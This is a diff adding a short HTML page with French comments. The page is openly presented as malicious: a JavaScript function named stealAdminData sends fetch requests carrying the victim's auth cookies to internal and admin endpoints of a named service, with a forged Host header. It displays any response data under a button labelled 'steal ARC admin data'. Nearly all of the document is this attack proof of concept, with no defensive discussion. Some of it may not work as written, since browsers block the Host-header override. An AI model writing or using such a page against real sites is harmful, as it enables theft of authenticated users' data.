@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<script>
+// Page malveillante sur https://shieldcore.be (ton domaine)
+async function stealAdminData() {
+  const endpoints = [
+    {host: 'internal.circle.com', path: '/health'},
+    {host: 'internal.circle.com', path: '/metrics'},
+    {host: 'admin.circle.com', path: '/status'}
+  ];
+  
+  for (const ep of endpoints) {
+    try {
+      const response = await fetch(`https://rpc.testnet.arc.network${ep.path}`, {
+        headers: {'Host': ep.host},
+        credentials: 'include' // Envoie les cookies auth
+      });
+      
+      console.log(`${ep.host}${ep.path}:`, response.status);
+      
+      // Si admin authentifié, on peut lire les données
+      if (response.ok) {
+        const data = await response.text();
+        document.getElementById('stolen').innerHTML += 
+          `<h3>${ep.host}${ep.path}</h3><pre>${data.substring(0,500)}</pre>`;
+      }
+    } catch(e) {
+      console.log('Error:', e.message);
+    }
+  }
+}
+</script>
+<button onclick="stealAdminData()">Voler données admin ARC</button>
+<div id="stolen"></div>
